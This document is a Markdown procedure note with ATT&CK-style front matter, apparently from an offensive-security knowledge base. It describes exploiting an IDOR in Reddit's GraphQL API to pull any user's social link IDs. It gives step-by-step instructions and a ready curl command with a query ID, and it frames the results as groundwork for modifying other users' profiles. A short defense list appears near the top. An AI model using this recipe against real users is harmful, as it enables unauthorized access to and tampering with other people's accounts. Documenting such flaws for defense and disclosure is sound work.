---
id: proc-uuid-1
tags:
  - idor
  - graphql
  - fetch
  - recon
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/graphql-fetch-reddit-social-links]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:48.157Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Fetch-Reddit-User-Social-Links-via-IDOR

## Summary

This procedure exploits an IDOR in Reddit's GraphQL API to fetch social link details and IDs for any arbitrary user by providing their username, bypassing authorization checks.

## Description

In the context of Reddit's profile management, the GraphQL query with ID '11a239b07f86' allows authenticated users to retrieve social links without verifying if they own the profile. This enables attackers to enumerate link IDs for targeted users, setting up further exploitation like modifications. Prerequisites include a valid Reddit Bearer token obtained from an authenticated session.

## Requirements

1. Authenticated Reddit account with valid Bearer token
2. Access to HTTP client (e.g., curl)
3. Target username

## Defense

Defensive measures and detection strategies:

- Implement server-side authorization checks for all user-specific API queries
- Rate-limit GraphQL requests by username to detect enumeration
- Log and monitor anomalous fetches for non-owned profiles

## Objectives

1. Retrieve social link IDs for unauthorized user
2. Enable subsequent IDOR exploitation
3. Gather intelligence on user profiles

## Instructions

### Step 1: Prepare Authentication

**Context**: Obtain a valid Bearer token from your Reddit session (e.g., via browser dev tools or login API).

### Step 2: Execute Fetch Query

**Context**: Send the GraphQL query to retrieve links for the target user.

**Command** ([[commands/graphql-fetch-reddit-social-links]]):
```bash
curl -X POST https://gql.reddit.com/ \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -d '{"id":"11a239b07f86","variables":{"username":"targetuser"}}'
```

> This command queries the API and returns a JSON object with the 'socialLinks' array, each containing 'id', 'outboundUrl', 'title', and 'type'. Extract the 'id' for use in modifications.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-fetch-reddit-social-links]]

## Tools Used


## Tags

- idor
- graphql
- reddit
